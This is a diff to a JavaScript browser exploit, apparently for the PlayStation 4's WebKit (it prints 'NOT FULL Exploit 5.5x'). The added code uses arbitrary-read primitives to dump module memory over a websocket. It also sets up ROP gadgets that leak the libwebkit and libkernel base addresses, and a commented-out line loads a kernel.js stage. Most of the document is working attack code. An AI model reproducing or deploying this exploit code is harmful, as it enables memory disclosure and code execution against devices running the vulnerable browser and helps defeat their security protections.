@@ -1,4 +1,36 @@
 
+var log = function(x) {
+    document.getElementById("console").innerText += x + "\n";
+}
+var print = function(string) { // like log but html
+    document.getElementById("console").innerHTML += string + "\n";
+}
+
+var dumpModuleXHR = function(moduleBase) {
+    var chunk = new ArrayBuffer(0x1000);
+    var chunk32 = new Uint32Array(chunk);
+    var chunk8 = new Uint8Array(chunk);
+    
+    connection.binaryType = "arraybuffer";
+    var helo = new Uint32Array(1);
+    helo[0] = 0x41414141;
+    
+    var moduleBase_ = moduleBase.add32(0);
+    connection.onmessage = function() {
+        try {
+            for (var i = 0; i < chunk32.length; i++)
+            {
+                var val = p.read4(moduleBase_);
+                chunk32[i] = val;
+                moduleBase_.add32inplace(4);
+            }
+            connection.send(chunk8);
+        } catch (e) {
+            print(e);
+        }
+    }
+}
+
 var exploit = function() {
   p=window.primitives;
 
@@ -23,24 +55,25 @@ var exploit = function() {
     window.moduleBaseWebKit = webKitBase;
 
     print("libwebkit base at: 0x" + webKitBase);
-     
-var gadget = function(o)
-    {
-        return webKitBase.add32(o);
-    }
-        gadgets = {"stack_chk_fail": gadget(0x000000c8),
+    var gadget = function(o){return webKitBase.add32(o);}
+        gadgets = {
 
-    };  
+        "stack_chk_fail":         gadget(0x000000c8),
+    }; 
 
     var libKernelBase = p.read8(deref_stub_jmp(gadgets.stack_chk_fail));
     window.libKernelBase = libKernelBase;
     libKernelBase.low &= 0xfffff000;
-    libKernelBase.sub32inplace(0x12000);
+    libKernelBase.sub32inplace(0x12000);  
+
+           // Get libc module address
+
     
-    window.moduleBaseLibKernel = libKernelBase;
+    window.moduleBaseLibKernel = libKernelBase; 
     
+
     print("libkernel_web base at: 0x" + libKernelBase);
-       
+     
 // Basic memory functions
 function malloc(size)
 {
@@ -179,7 +212,7 @@ window.rop = function() {
   
   return this;
 };
-   
+ 
  
     log("--- welcome to all stage ---");
     print("stage2");
@@ -189,6 +222,9 @@ window.rop = function() {
     print("all stages test");
     print("NOT FULL Exploit 5.5x");
     
+    /*sc = document.createElement("script");
+    sc.src="kernel.js";
+    document.body.appendChild(sc);}, 100);*/
 }
 
    
